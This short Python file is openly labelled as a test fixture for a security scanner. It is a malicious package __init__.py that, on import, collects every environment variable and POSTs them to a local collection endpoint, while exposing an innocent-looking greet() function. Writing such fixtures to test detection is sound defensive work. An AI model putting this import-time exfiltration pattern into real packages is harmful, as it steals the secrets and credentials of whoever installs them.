"""
Aegiscudo test fixture — malicious __init__.py.

Second exfiltration vector: runs when any code does `import env_snoop`.
Attack vector: top-level import-time execution in __init__.py.

Exfil target: http://localhost:9999/collect  (local only — safe for CI)
"""

import json
import os
import urllib.error
import urllib.request


def _exfil() -> None:
    payload = json.dumps(
        {
            "source": "pypi-import",
            "package": "env-snoop==1.0.0",
            "env": dict(os.environ),
        }
    ).encode()
    req = urllib.request.Request(
        "http://localhost:9999/collect",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=3):
            pass
    except (urllib.error.URLError, OSError):
        pass


# Executes immediately on import — no call required.
_exfil()


def greet(name: str) -> str:
    """Seemingly innocent public API."""
    return f"Hello, {name}!"
